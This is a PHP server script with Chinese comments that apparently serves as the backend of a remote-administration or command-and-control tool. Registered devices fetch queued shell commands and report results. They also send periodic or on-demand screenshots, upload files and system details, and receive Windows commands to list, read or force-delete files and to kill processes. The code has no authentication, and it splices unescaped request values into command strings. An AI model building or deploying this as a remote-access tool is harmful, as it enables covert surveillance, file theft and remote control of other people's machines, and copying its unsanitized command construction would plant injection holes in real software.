<?php
// 引入文件存储类
require_once 'storage.php';

// 获取请求类型
$action = isset($_GET['action']) ? $_GET['action'] : '';

// 处理不同的请求
switch ($action) {
    // 设备上线
    case 'online':
        handleDeviceOnline();
        break;
    
    // 获取命令
    case 'get_command':
        getCommand();
        break;
    
    // 提交命令结果
    case 'submit_result':
        submitResult();
        break;
    
    // 设备心跳
    case 'heartbeat':
        updateHeartbeat();
        break;
    
    // 屏幕监控
    case 'screenshot':
        handleScreenshot();
        break;
    
    // 文件管理
    case 'file_list':
        getFileList();
        break;
    case 'file_download':
        downloadFile();
        break;
    case 'file_upload':
        uploadFile();
        break;
    case 'file_delete':
        deleteFile();
        break;
    
    // 进程管理
    case 'process_list':
        getProcessList();
        break;
    case 'process_kill':
        killProcess();
        break;
    
    // 系统信息
    case 'system_info':
        getSystemInfo();
        break;
    case 'submit_system_info':
        submitSystemInfo();
        break;
    
    // 截图命令获取
    case 'get_screenshot_command':
        getScreenshotCommand();
        break;
    
    default:
        echo 'Invalid action';
        break;
}

// 获取截图命令
function getScreenshotCommand() {
    global $storage;
    
    $device_id = isset($_GET['device_id']) ? $_GET['device_id'] : '';
    
    if (empty($device_id)) {
        echo json_encode(array('status' => 'error', 'message' => 'Missing device_id'));
        return;
    }
    
    // 检查是否有手动截图请求
    $screenshot_request = $storage->getPendingScreenshotRequest($device_id);
    if ($screenshot_request) {
        // 返回截图命令
        echo json_encode(array(
            'status' => 'success',
            'command_id' => 'screenshot_' . time(),
            'command_type' => 'screenshot'
        ));
        return;
    }
    
    // 检查是否需要定时截图
    $setting = $storage->getScreenshotSetting($device_id);
    $device = $storage->getDevice($device_id);
    
    if ($setting['enabled'] && $device) {
        $last_screenshot = isset($device['last_screenshot']) ? strtotime($device['last_screenshot']) : 0;
        $current_time = time();
        
        // 检查是否到了截图时间
        if ($current_time - $last_screenshot >= $setting['interval']) {
            // 返回截图命令
            echo json_encode(array(
                'status' => 'success',
                'command_id' => 'screenshot_' . time(),
                'command_type' => 'screenshot'
            ));
            return;
        }
    }
    
    echo json_encode(array('status' => 'no_screenshot', 'message' => 'No screenshot required'));
}

// 设备上线处理
function handleDeviceOnline() {
    global $storage;
    
    $device_id = isset($_GET['device_id']) ? $_GET['device_id'] : '';
    $device_name = isset($_GET['device_name']) ? $_GET['device_name'] : 'Unknown';
    
    if (empty($device_id)) {
        echo 'Missing device_id';
        return;
    }
    
    // 检查设备是否已存在
    $device = $storage->getDevice($device_id);
    
    $device_data = array(
        'device_id' => $device_id,
        'device_name' => $device_name,
        'status' => 1,
        'last_online' => date('Y-m-d H:i:s')
    );
    
    // 保留原有系统信息，不自动生成
    if (isset($device['system_info']) && $device['system_info'] !== null) {
        $device_data['system_info'] = $device['system_info'];
        $device_data['system_info_updated_at'] = $device['system_info_updated_at'];
    }
    
    if ($device) {
        // 更新设备信息
        $device_data['created_at'] = $device['created_at'];
        $storage->saveDevice($device_id, $device_data);
        echo 'Device updated';
    } else {
        // 新增设备
        $device_data['created_at'] = date('Y-m-d H:i:s');
        $storage->saveDevice($device_id, $device_data);
        echo 'Device registered';
    }
}

// 获取待执行命令
function getCommand() {
    global $storage;
    
    $device_id = isset($_GET['device_id']) ? $_GET['device_id'] : '';
    
    if (empty($device_id)) {
        echo json_encode(array('status' => 'error', 'message' => 'Missing device_id'));
        return;
    }
    
    // 获取未执行的命令
    $command = $storage->getPendingCommand($device_id);
    
    if ($command) {
        // 更新命令状态为已执行
        $storage->updateCommandStatus($command['id'], 1);
        
        // 返回命令内容
        echo json_encode(array(
            'status' => 'success',
            'command_id' => $command['id'],
            'command' => $command['command']
        ));
    } else {
        echo json_encode(array('status' => 'no_command', 'message' => 'No command'));
    }
}

// 提交命令执行结果
function submitResult() {
    global $storage;
    
    $device_id = isset($_POST['device_id']) ? $_POST['device_id'] : '';
    $command_id = isset($_POST['command_id']) ? $_POST['command_id'] : '';
    $result = isset($_POST['result']) ? $_POST['result'] : '';
    
    if (empty($device_id) || empty($command_id)) {
        echo 'Missing parameters';
        return;
    }
    
    // 更新命令结果
    $storage->updateCommandStatus($command_id, 2, $result);
    
    echo 'Result submitted';
}

// 更新设备心跳
function updateHeartbeat() {
    global $storage;
    
    $device_id = isset($_GET['device_id']) ? $_GET['device_id'] : '';
    
    if (empty($device_id)) {
        echo 'Missing device_id';
        return;
    }
    
    // 检查设备是否已存在
    $device = $storage->getDevice($device_id);
    
    if ($device) {
        // 更新设备信息
        $device['status'] = 1;
        $device['last_online'] = date('Y-m-d H:i:s');
        $storage->saveDevice($device_id, $device);
        echo 'Heartbeat updated';
    } else {
        echo 'Device not found';
    }
}

// 屏幕截图处理
function handleScreenshot() {
    global $storage;
    
    $device_id = isset($_POST['device_id']) ? $_POST['device_id'] : '';
    $screenshot_data = isset($_POST['screenshot_data']) ? $_POST['screenshot_data'] : '';
    
    if (empty($device_id) || empty($screenshot_data)) {
        echo json_encode(array('status' => 'error', 'message' => 'Missing parameters'));
        return;
    }
    
    // 确保screenshots目录存在
    $screenshots_dir = dirname(__FILE__) . '/screenshots';
    if (!is_dir($screenshots_dir)) {
        mkdir($screenshots_dir, 0755, true);
    }
    
    // 保存屏幕截图数据
    $screenshot_info = array(
        'file_path' => 'screenshots/' . $device_id . '_' . date('YmdHis') . '.png',
        'file_size' => strlen(base64_decode($screenshot_data)),
        'width' => 0, // 客户端可以传递实际宽度
        'height' => 0 // 客户端可以传递实际高度
    );
    
    // 保存截图到文件
    $screenshot_file = dirname(__FILE__) . '/' . $screenshot_info['file_path'];
    file_put_contents($screenshot_file, base64_decode($screenshot_data));
    
    // 保存截图信息到存储
    $screenshot_id = $storage->saveScreenshot($device_id, $screenshot_info);
    
    // 更新设备的最后截图时间
    $device = $storage->getDevice($device_id);
    if ($device) {
        $device['last_screenshot'] = date('Y-m-d H:i:s');
        $storage->saveDevice($device_id, $device);
    }
    
    echo json_encode(array('status' => 'success', 'screenshot_id' => $screenshot_id));
}

// 获取文件列表
function getFileList() {
    global $storage;
    
    $device_id = isset($_GET['device_id']) ? $_GET['device_id'] : '';
    $path = isset($_GET['path']) ? $_GET['path'] : '.';
    
    if (empty($device_id)) {
        echo json_encode(array('status' => 'error', 'message' => 'Missing device_id'));
        return;
    }
    
    // 返回命令，让客户端执行文件列表获取（Windows系统使用dir命令）
    $command = "dir {$path}";
    
    echo json_encode(array(
        'status' => 'command',
        'command' => $command,
        'command_type' => 'file_list',
        'path' => $path
    ));
}

// 文件下载处理
function downloadFile() {
    global $storage;
    
    $device_id = isset($_GET['device_id']) ? $_GET['device_id'] : '';
    $file_path = isset($_GET['file_path']) ? $_GET['file_path'] : '';
    
    if (empty($device_id) || empty($file_path)) {
        echo json_encode(array('status' => 'error', 'message' => 'Missing parameters'));
        return;
    }
    
    // 返回命令，让客户端执行文件下载（Windows系统使用type命令）
    $command = "type {$file_path}";
    
    echo json_encode(array(
        'status' => 'command',
        'command' => $command,
        'command_type' => 'file_download',
        'file_path' => $file_path
    ));
}

// 文件上传处理
function uploadFile() {
    global $storage;
    
    $device_id = isset($_POST['device_id']) ? $_POST['device_id'] : '';
    $file_path = isset($_POST['file_path']) ? $_POST['file_path'] : '';
    $file_content = isset($_POST['file_content']) ? $_POST['file_content'] : '';
    
    if (empty($device_id) || empty($file_path) || empty($file_content)) {
        echo json_encode(array('status' => 'error', 'message' => 'Missing parameters'));
        return;
    }
    
    // 确保uploads目录存在
    $uploads_dir = dirname(__FILE__) . '/uploads';
    if (!is_dir($uploads_dir)) {
        mkdir($uploads_dir, 0755, true);
    }
    
    // 保存上传的文件
    $upload_file = dirname(__FILE__) . '/uploads/' . basename($file_path);
    file_put_contents($upload_file, base64_decode($file_content));
    
    // 保存文件信息
    $file_info = array(
        'file_path' => $file_path,
        'file_name' => basename($file_path),
        'file_size' => filesize($upload_file),
        'file_type' => mime_content_type($upload_file),
        'md5' => md5_file($upload_file)
    );
    
    $file_id = $storage->saveFileInfo($device_id, $file_info);
    
    echo json_encode(array('status' => 'success', 'file_id' => $file_id));
}

// 文件删除处理
function deleteFile() {
    global $storage;
    
    $device_id = isset($_GET['device_id']) ? $_GET['device_id'] : '';
    $file_path = isset($_GET['file_path']) ? $_GET['file_path'] : '';
    
    if (empty($device_id) || empty($file_path)) {
        echo json_encode(array('status' => 'error', 'message' => 'Missing parameters'));
        return;
    }
    
    // 返回命令，让客户端执行文件删除（Windows系统使用del命令）
    $command = "del /f /q {$file_path}";
    
    echo json_encode(array(
        'status' => 'command',
        'command' => $command,
        'command_type' => 'file_delete',
        'file_path' => $file_path
    ));
}

// 获取进程列表
function getProcessList() {
    global $storage;
    
    $device_id = isset($_GET['device_id']) ? $_GET['device_id'] : '';
    
    if (empty($device_id)) {
        echo json_encode(array('status' => 'error', 'message' => 'Missing device_id'));
        return;
    }
    
    // 返回命令，让客户端执行进程列表获取（Windows系统使用tasklist命令）
    $command = "tasklist";
    
    echo json_encode(array(
        'status' => 'command',
        'command' => $command,
        'command_type' => 'process_list'
    ));
}

// 进程终止处理
function killProcess() {
    global $storage;
    
    $device_id = isset($_GET['device_id']) ? $_GET['device_id'] : '';
    $pid = isset($_GET['pid']) ? $_GET['pid'] : '';
    
    if (empty($device_id) || empty($pid)) {
        echo json_encode(array('status' => 'error', 'message' => 'Missing parameters'));
        return;
    }
    
    // 返回命令，让客户端执行进程终止（Windows系统使用taskkill命令）
    $command = "taskkill /f /pid {$pid}";
    
    echo json_encode(array(
        'status' => 'command',
        'command' => $command,
        'command_type' => 'process_kill',
        'pid' => $pid
    ));
}

// 获取系统信息
function getSystemInfo() {
    global $storage;
    
    $device_id = isset($_GET['device_id']) ? $_GET['device_id'] : '';
    
    if (empty($device_id)) {
        echo json_encode(array('status' => 'error', 'message' => 'Missing device_id'));
        return;
    }
    
    // 返回命令，让客户端执行系统信息获取（Windows系统使用Windows命令）
    $command = 'systeminfo; ver; wmic os get LastBootUpTime; wmic diskdrive get size,freeSpace; systeminfo | findstr /C:"Total Physical Memory"; whoami';
    
    echo json_encode(array(
        'status' => 'command',
        'command' => $command,
        'command_type' => 'system_info'
    ));
}

// 提交系统信息
function submitSystemInfo() {
    global $storage;
    
    $device_id = isset($_POST['device_id']) ? $_POST['device_id'] : '';
    $system_info = isset($_POST['system_info']) ? $_POST['system_info'] : '';
    
    // 记录获取到的原始系统信息
    $log_file = dirname(__FILE__) . '/system_info_log.txt';
    $log_content = "[" . date('Y-m-d H:i:s') . "] Device ID: {$device_id}
";
    $log_content .= "Raw System Info: {$system_info}\n";
    $log_content .= "Decoded System Info: " . print_r(json_decode($system_info, true), true) . "\n\n";
    file_put_contents($log_file, $log_content, FILE_APPEND);
    
    if (empty($device_id) || empty($system_info)) {
        echo json_encode(array('status' => 'error', 'message' => 'Missing parameters'));
        return;
    }
    
    // 保存系统信息
    $storage->saveSystemInfo($device_id, json_decode($system_info, true));
    
    // 返回获取到的系统信息，方便调试
    echo json_encode(array(
        'status' => 'success',
        'received_system_info' => json_decode($system_info, true)
    ));
}
?>